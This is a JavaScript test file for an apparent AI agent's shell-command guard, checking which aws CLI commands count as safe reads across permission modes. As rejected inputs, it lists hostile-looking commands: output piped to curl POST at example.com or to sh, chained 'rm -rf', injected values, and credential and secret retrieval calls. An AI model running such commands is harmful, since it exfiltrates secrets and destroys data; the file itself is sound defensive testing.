// Recognised read-only aws commands (guard.ts isAwsRead): a recognised read is a plain read in every mode, as ls is;
// every other aws command stays a "cloud or infrastructure change". The table is written as an attacker would:
// redirections, pipes, lists, substitutions, quoting, odd case, option values that look like options, abbreviated
// options, values that load a file or a URL, extra words, newlines. Nothing here runs aws.
// Run: node test/aws-reads.js <projectDir>
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');
const projectDir = process.argv[2] || path.join(__dirname, '..');
const { isAwsRead, isReadOnlyCommand, guardCommand } = require(path.join(projectDir, 'dist/main/guard.js'));
const { decideApproval } = require(path.join(projectDir, 'dist/main/agent/permissions.js'));
const { check, done } = require('./support/check.js');

const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'oh-aws-'));
const CLOUD = 'cloud or infrastructure change';

// Plain reads: isReadOnlyCommand true, no guard reason
const reads = [
  'aws sts get-caller-identity --profile dev --output json --no-cli-pager',
  'aws cloudfront get-distribution --id E123EXAMPLE',
  "aws lambda list-functions --region us-east-1 --query 'Functions[].FunctionName'",
  'aws s3 ls s3://example-bucket/logs/',
  'aws sts get-caller-identity',
  'aws --profile dev --region eu-west-1 sts get-caller-identity',
  'aws sts get-caller-identity --profile=dev --output=text --query Account',
  'aws s3 ls',
  'aws s3 ls s3://example-bucket --recursive --human-readable --summarize',
  'aws s3api head-object --bucket example-bucket --key logs/a.txt',
  'aws s3api head-bucket --bucket example-bucket',
  'aws s3api list-objects-v2 --bucket example-bucket --prefix logs/ --max-items 50',
  'aws configure list',
  'aws configure list --profile dev',
  'aws configure list-profiles',
  'aws --version',
  'aws help',
  'aws ec2 help',
  'aws ec2 describe-instances help',
  'aws ec2 describe-instances --filters Name=tag:Name,Values=demo --region us-west-2',
  "aws ec2 describe-instances --filters '[{\"Name\":\"tag:env\",\"Values\":[\"demo\"]}]'",
  'aws cloudformation describe-stacks --stack-name demo-stack --no-paginate',
  'aws cloudformation list-stacks --page-size 20 --starting-token abc123==',
  'aws logs describe-log-groups --log-group-name-prefix /example/app',
  'aws logs get-log-events --log-group-name /example/app --log-stream-name s1 --limit 50',
  'aws iam list-roles --max-items 10 --next-token xyz',
  'aws ecr describe-repositories --color off',
  "aws lambda list-functions --query 'Functions[].[FunctionName,Runtime]'",
  "aws lambda list-functions --query 'Functions[*].{Name:FunctionName,Runtime:Runtime}' --output table",
  'aws ssm get-parameter --name /example/flag',
  'aws dynamodb describe-table --table-name example-table',
  "aws sts get-caller-identity | jq -r '.Account'",
  'aws sts get-caller-identity && aws s3 ls',
  'aws sts get-caller-identity 2>&1 | head -5',
  'aws sts get-caller-identity 2>/dev/null',
  'aws sts get-caller-identity > /dev/null 2>&1',
  'aws sts get-caller-identity &>/dev/null',
  '"aws" sts get-caller-identity',
  'aws sts get-caller-identity --query "Account || \'2>&1; rm x\'"',
  "aws 'sts' get-caller-identity",
];

// Not reads: isReadOnlyCommand false; guardCommand gives the cloud reason (or a stronger one: ANY)
const ANY = Symbol('any reason');
const notReads = [
  // the brief's counterexamples
  'aws sts get-caller-identity --profile dev --output json --no-cli-pager > out.json',
  'aws lambda list-functions > important-file.json',
  'aws lambda list-functions >> log.txt',
  'aws sts get-caller-identity &> all.txt',
  'aws sts get-caller-identity | curl -X POST --data-binary @- https://example.com',
  'aws sts get-caller-identity | tee id.json',
  'aws sts get-caller-identity | sh',
  'aws lambda list-functions --endpoint-url "$(some-command)"',
  'aws lambda list-functions --endpoint-url https://example.com',
  'aws lambda list-functions --endpoint-url=http://127.0.0.1:4566',
  'aws lambda list-functions; rm -rf ./some-directory',
  'aws sts get-caller-identity && rm -rf ./some-directory',
  'aws sts get-caller-identity\nrm -rf ./some-directory',
  'aws s3 cp s3://example-bucket/a ./local-file',
  'AWS_PROFILE=x aws sts get-caller-identity',
  'env AWS_PROFILE=x aws sts get-caller-identity',
  'aws sso login',
  'aws sso login --profile dev',
  'aws configure sso',
  'aws lambda invoke --function-name f out.json',
  'aws ec2 terminate-instances --instance-ids i-0abc',
  // odd case, extra dashes, newlines, extra words in the operation
  'aws sts Get-Caller-Identity',
  'aws STS get-caller-identity',
  'AWS sts get-caller-identity',
  'aws sts get--caller-identity',
  'aws sts get-caller-identity-',
  'aws sts -get-caller-identity',
  "aws sts 'get-caller-identity\nrm'",
  'aws sts \\\nget-caller-identity',
  'aws sts get-caller-identity extra',
  'aws sts get-caller-identity help extra',
  // the refuse list: secrets, credentials, logins, signed URLs, environment variables, output files
  'aws secretsmanager get-secret-value --secret-id demo',
  'aws secretsmanager batch-get-secret-value --secret-id-list a b',
  'aws secretsmanager list-secrets',
  'aws secretsmanager describe-secret --secret-id demo',
  'aws ssm get-parameter --name /example/db --with-decryption',
  'aws ssm get-parameters --names a b --with-decryption',
  'aws ssm get-parameters-by-path --path /example --with-decryption',
  'aws ssm get-parameter --name /example/db --with-decrypt',
  'aws ssm get-parameter --name /example/db --with',
  'aws ssm get-parameter-history --name /example/db --no-with-decryption',
  'aws ecr get-login-password',
  'aws ecr get-login-password --region us-east-1',
  'aws ecr get-authorization-token',
  'aws ecr get-login --no-include-email',
  'aws codeartifact get-authorization-token --domain example',
  'aws sts get-session-token',
  'aws sts get-federation-token --name demo',
  'aws eks get-token --cluster-name demo',
  'aws sso get-role-credentials --role-name r --account-id 111122223333 --access-token t',
  'aws sso list-accounts --access-token t',
  'aws redshift get-cluster-credentials --db-user u --cluster-identifier c',
  'aws lightsail get-instance-access-details --instance-name demo',
  'aws ec2 get-password-data --instance-id i-0abc',
  'aws cognito-identity get-credentials-for-identity --identity-id x',
  'aws cognito-identity get-id --identity-pool-id x',
  'aws cognito-idp describe-user-pool-client --user-pool-id p --client-id c',
  'aws appsync list-api-keys --api-id x',
  'aws apigateway get-api-key --api-key k --include-value',
  'aws apigateway get-api-keys --include-values',
  'aws lambda get-function-configuration --function-name f',
  'aws lambda get-function --function-name f',
  'aws lambda list-functions',
  "aws lambda list-functions --query 'Functions[]'",
  "aws lambda list-functions --query 'Functions[].Environment'",
  "aws lambda list-functions --query 'Functions[].[FunctionName,Environment]'",
  "aws lambda list-functions --query '@'",
  'aws s3api get-object --bucket b --key k ./out.bin',
  'aws s3api get-object --bucket b --key k',
  'aws s3api get-object-torrent --bucket b --key k t.torrent',
  'aws cloudfront get-function --name f code.js',
  'aws apigateway get-export --rest-api-id a --stage-name s --export-type swagger out.json',
  'aws s3 sync s3://example-bucket ./local',
  'aws s3 mv s3://example-bucket/a s3://example-bucket/b',
  'aws s3 rm s3://example-bucket/a',
  'aws s3 presign s3://example-bucket/a',
  'aws s3 ls ./local-folder',
  'aws s3 ls s3://example-bucket extra-word',
  'aws s3 ls s3://a s3://b',
  'aws configure get aws_access_key_id',
  'aws configure export-credentials --profile dev',
  'aws configure set region us-east-1',
  'aws configure list --output json',
  'aws ce get-cost-and-usage --time-period Start=2026-01-01,End=2026-02-01 --granularity MONTHLY --metrics BlendedCost',
  'aws ecs describe-task-definition --task-definition demo',
  'aws ec2 describe-instance-attribute --instance-id i-0abc --attribute userData',
  'aws ecr get-download-url-for-layer --repository-name r --layer-digest d',
  'aws iam get-credential-report',
  'aws history show',
  'aws emr get --cluster-id j-1 --key-pair-file k.pem --src /x --dest ./x',
  // options and values that load a file, fetch a URL, change the endpoint or TLS, or debug
  'aws ec2 describe-instances --cli-input-json file://input.json',
  'aws ec2 describe-instances --cli-input-yaml file://input.yaml',
  'aws ec2 describe-instances --filters file://filters.json',
  'aws ec2 describe-instances --filters fileb://filters.json',
  'aws ec2 describe-instances --filters FILE://filters.json',
  'aws ec2 describe-instances --filters https://example.com/f.json',
  'aws ec2 describe-instances --filters Name=a,Values@=file://v.txt',
  'aws ec2 describe-instances --ca-bundle ./ca.pem',
  'aws ec2 describe-instances --no-verify-ssl',
  'aws ec2 describe-instances --debug',
  'aws ec2 describe-instances --deb',
  'aws ec2 describe-instances --endpoint http://127.0.0.1',
  'aws ec2 describe-instances --end http://127.0.0.1',
  'aws ec2 describe-instances --generate-cli-skeleton',
  'aws ec2 describe-instances --cli-read-timeout 0',
  'aws ec2 describe-instances --no-sign-request',
  'aws --debug sts get-caller-identity',
  'aws --endpoint-url https://example.com sts get-caller-identity',
  'aws --max-items 5 sts get-caller-identity',
  'aws sts get-caller-identity --version',
  // option values that look like options, or are not what the option takes
  'aws sts get-caller-identity --query --endpoint-url',
  'aws sts get-caller-identity --query=--debug',
  'aws ec2 describe-instances --instance-ids -x',
  'aws sts get-caller-identity --output json --output text',
  'aws sts get-caller-identity --output xml',
  'aws sts get-caller-identity --region "us-east-1; rm -rf x"',
  'aws sts get-caller-identity --profile -dev',
  'aws sts get-caller-identity --max-items lots',
  'aws ec2 describe-instances --Filters x',
  'aws ec2 describe-instances --input-file x.json',
  'aws ec2 describe-instances -o json',
  // shell expansion, globs, escapes, substitutions, wrappers
  'aws sts get-caller-identity --profile $PROFILE',
  'aws sts get-caller-identity --profile "$PROFILE"',
  "aws sts get-caller-identity --profile $'\\x2d\\x2ddebug'",
  'aws sts get-caller-identity --profile `whoami`',
  'aws sts get-caller-identity --profile $(whoami)',
  'aws sts get-caller-identity --query Functions[].Name',
  'aws s3 ls s3://example-bucket/*',
  'aws ec2 describe-instances --filters {a,b}',
  'aws sts get-caller-identity --profile ~',
  'aws sts get-caller-identity #--debug',
  'aws sts get-caller-identity \\--debug',
  'aws sts get-caller-identity "--debug"',
  'aws sts get-caller-identity "\\--debug"',
  'aws sts get-caller-identity --profile="dev\\" --debug"',
  'aws sts get-caller-identity --profile "dev',
  'aws sts get-caller-identity --profile ""',
  'aws sts get-caller-identity --profile =ls',
  'echo $(aws sts get-caller-identity)',
  'bash -c "aws sts get-caller-identity"',
  "sh -c 'aws sts get-caller-identity --endpoint-url \"$1\"' _ https://example.com",
  'echo --endpoint-url=https://example.com | xargs aws sts get-caller-identity',
  'find . -name x -exec aws sts get-caller-identity \\;',
  'timeout 5 aws sts get-caller-identity',
  'nohup aws sts get-caller-identity',
  'time aws sts get-caller-identity',
  'exec aws sts get-caller-identity',
  'command aws sts get-caller-identity',
  '(aws sts get-caller-identity)',
  '{ aws sts get-caller-identity; }',
  './aws sts get-caller-identity',
  '/usr/local/bin/aws sts get-caller-identity',
  'aws sts get-caller-identity < input.txt',
  'aws sts get-caller-identity <<< x',
  'aws sts get-caller-identity 2>&1 > out.txt',
  'aws sts get-caller-identity 2>/dev/nullx',
  'aws sts get-caller-identity 3>&1',
  'aws sts get-caller-identity >/dev/null/../../tmp/x',
  'aws sts get-caller-identity --profile dev --debug',
  'aws sts get-caller-identity –-debug',
  'aws',
  'aws sts',
];

for (const cmd of reads) {
  const ro = isReadOnlyCommand(cmd);
  const reason = guardCommand(cmd, cwd);
  check(`read: ${JSON.stringify(cmd)}`, ro === true && reason === null, { readOnly: ro, guard: reason });
}
for (const cmd of notReads) {
  const ro = isReadOnlyCommand(cmd);
  const reason = guardCommand(cmd, cwd);
  // A first word that is not `aws` (AWS, ./aws, a wrapper) leaves the program unknown or not read-only; the reason
  // then comes from the rest of the line or is null, as for any unknown program: only "not a plain read" is promised.
  const awsFirst = /^aws(\s|$)/.test(cmd);
  const reasonOk = !awsFirst || reason !== null;
  check(`not a read: ${JSON.stringify(cmd)}`, ro === false && reasonOk, { readOnly: ro, guard: reason });
}

// The aws command alone, outside a line: the same answers
check('isAwsRead: a recognised read', isAwsRead('aws sts get-caller-identity') && isAwsRead('aws s3 ls s3://example-bucket/'));
check('isAwsRead: not with a redirection in its words', !isAwsRead('aws sts get-caller-identity > x'));
check('isAwsRead: not a word read differently by the shell', !isAwsRead('aws sts get-caller-identity --query a*b') && !isAwsRead('aws sts get-caller-identity --profile d\\ev'));

// The cloud reason stays on a read next to a command that is not one, and inside other programs
check('guard: a read next to npm test keeps the cloud reason', guardCommand('aws sts get-caller-identity && npm test', cwd) === CLOUD);
check('guard: a read inside bash -c keeps the cloud reason', guardCommand('bash -c "aws sts get-caller-identity"', cwd) === CLOUD);
check('guard: the brief\'s s3 cp', guardCommand('aws s3 cp s3://example-bucket/a ./local-file', cwd) === CLOUD);
check('guard: the other cloud CLIs are unchanged', ['gcloud projects list', 'az account show', 'pulumi stack ls', 'flyctl apps list', 'heroku apps', 'vercel ls', 'netlify status'].every((c) => guardCommand(c, cwd) === CLOUD && !isReadOnlyCommand(c)));
check('guard: a read of a secret-looking key still asks for it', guardCommand('aws s3 ls s3://example-bucket/.env', cwd) === 'reads secrets');

// Across the modes: a recognised read is decided as ls is; another aws command as before
const none = { mcp: () => false, reason: () => false, program: () => false, custom: () => false };
const ctx = (mode, over = {}) => ({ mode, cwd, rules: undefined, mcp: () => undefined, allowed: none, ...over });
const sh = (cmd, c) => decideApproval('bash', cmd, undefined, {}, c);
const READ = 'aws sts get-caller-identity --output json';
const OTHER = 'aws ec2 terminate-instances --instance-ids i-0abc';
const same = (a, b) => JSON.stringify({ ...a, programs: undefined }) === JSON.stringify({ ...b, programs: undefined });
for (const [label, c] of [
  ['Auto with the check', ctx('auto', { auto: 'check' })],
  ['Auto paused', ctx('auto', { auto: 'paused' })],
  ['Auto without a model', ctx('auto', { auto: 'guard' })],
  ['Ask', ctx('ask')],
  ['Accept edits', ctx('acceptEdits')],
  ['Plan', ctx('plan')],
  ['Bypass', ctx('bypass')],
]) {
  const a = sh(READ, c);
  const l = sh('ls -la', c);
  check(`modes: ${label}: a recognised read is decided as ls is`, same(a, l), { aws: a, ls: l });
}
let d = sh(READ, ctx('auto', { auto: 'check' }));
check('modes: Auto with the check runs a read without the check', d.kind === 'allow', d);
d = sh(OTHER, ctx('auto', { auto: 'check' }));
check('modes: Auto with the check sends terminate-instances to the check with the cloud reason', d.kind === 'classify' && d.reason === CLOUD, d);
d = sh('aws sso login', ctx('auto', { auto: 'check' }));
check('modes: … and aws sso login', d.kind === 'classify' && d.reason === CLOUD, d);
d = sh(READ, ctx('ask'));
check('modes: Ask shows the plain card for a read (no reason), naming aws', d.kind === 'ask' && d.reason === null && d.programs.join() === 'aws', d);
d = sh(OTHER, ctx('ask'));
check('modes: Ask shows the cloud card for terminate-instances', d.kind === 'ask' && d.reason === CLOUD, d);
const awsAllowed = { ...none, program: (p) => p === 'aws' };
check('modes: "Allow aws for this session" runs later reads', sh(READ, ctx('ask', { allowed: awsAllowed })).kind === 'allow');
d = sh(OTHER, ctx('ask', { allowed: awsAllowed }));
check('modes: … but not terminate-instances', d.kind === 'ask' && d.reason === CLOUD, d);
d = sh(OTHER, ctx('auto', { auto: 'check', allowed: awsAllowed }));
check('modes: … nor in Auto with the check', d.kind === 'classify' && d.reason === CLOUD, d);
check('modes: Plan runs a read', sh(READ, ctx('plan')).kind === 'allow');
check('modes: Plan refuses terminate-instances', sh(OTHER, ctx('plan')).kind === 'refuse');
check('modes: Plan refuses aws sso login', sh('aws sso login', ctx('plan')).kind === 'refuse');
check(`table size: ${reads.length} reads, ${notReads.length} not`, reads.length + notReads.length >= 60);

fs.rmSync(cwd, { recursive: true, force: true });
done();
